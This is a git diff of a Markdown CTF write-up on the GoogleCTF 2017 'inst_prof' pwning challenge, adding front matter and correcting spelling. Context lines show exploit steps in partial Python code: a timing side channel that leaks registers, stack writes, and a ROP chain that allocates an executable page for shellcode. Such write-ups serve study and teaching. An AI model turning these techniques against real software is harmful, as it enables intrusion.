@@ -1,3 +1,8 @@
+---
+title: "GoogleCTF 2017 - Pwning - inst_prof"
+description: "A challenge accepting 4 bytes of shellcode that will be benchmarked by the service"
+---
+
 # inst_prof
 
 This challenge accepts 4 Bytes of Instructions and executes them in a tight loop, returning the runtime.
@@ -37,8 +42,8 @@ ret
 ```
 
 ## Leaking Stuff
-First of all we noticed, that the registers r14 and r15 are not altered between two iterations.
-This allows to preserve minimal state between two executions.
+First of all, we noticed, that the registers r14 and r15 are not altered between two iterations.
+This allows preserving minimal state between two executions.
 To leak registers, we stored the value to leak in r15 and extracted the value bit by bit.
 
 ```python
@@ -66,13 +71,13 @@ def leak_r15(lowest_bit=0, highest_bit=48):
     return leak
 ```
 
-As r12 holds the start timestamp, the returned runtime can be artificialy increased depending on r14.
-The time difference between 0 and 1 bits is roughly factor 2.
-Even though, as we only use one attempt to read a bit (without averagig) to reduce the toal runtime, this attemp of leaking fails sometimes.
+As r12 holds the start timestamp, the returned runtime can be artificially increased depending on r14.
+The time difference between the bits 0 and 1 is roughly factor 2.
+Even though, as we only use one attempt to read a bit (without averaging) to reduce the total runtime, this attempt of leaking fails sometimes.
 
 
 ## Writing to Stack
-To prepare a ropchain, we need to write arbitrary data to Stack.
+To prepare a ROP chain, we need to write arbitrary data to Stack.
 The address we want to write to is stored in r15.
 ```python
 def write_buff(what):
@@ -83,7 +88,7 @@ def write_buff(what):
 
 ## Exploit
 The binary already contains lots of nice gadgets, such as alloc_page, read_n and make_page executable.
-First we have to leak the address of the old Page and of course the binary base address for the ROP gadgets.
+First, we have to leak the address of the old Page and of course the binary base address for the ROP gadgets.
 
 ```python
 execute("pop r15; push r15")
@@ -93,10 +98,10 @@ execute("mov r15, rdi")
 page_old = leak_r15(lowest_bit=12,highest_bit=48)
 ```
 
-Then we prepare the rop chain.
+Then we prepare the ROP chain.
 We used the gadgets to allocate a new page, read arbitrary data and execute it.
-rsi already contains 0x1000, the size of one page, what was usefull for alloc_page and read_n.
-As the behavior for mmap is deterministic, we can compute the address of the newly allocated page from the previous allocated one.
+rsi already contains 0x1000, the size of one page, what was useful for alloc_page and read_n.
+As the behavior for mmap is deterministic, we can compute the address of the newly allocated page from the previously allocated one.
 
 ```python
 alloc_page = binary_base + 0x9f0
@@ -120,7 +125,7 @@ ropchain += struct.pack("<Q", page_old - 0x1000)
 ropchain += struct.pack("<Q", call_rbx)
 ```
 
-To write the ropchain without crashing the programm, we used rsp+0x1000 as a target and placed it in front of the mains stack frame.
+To write the ROP chain without crashing the program, we used rsp+0x1000 as a target and placed it in front of the mains stack frame.
 
 ```python
 execute("mov %r15, %rsp; ret")
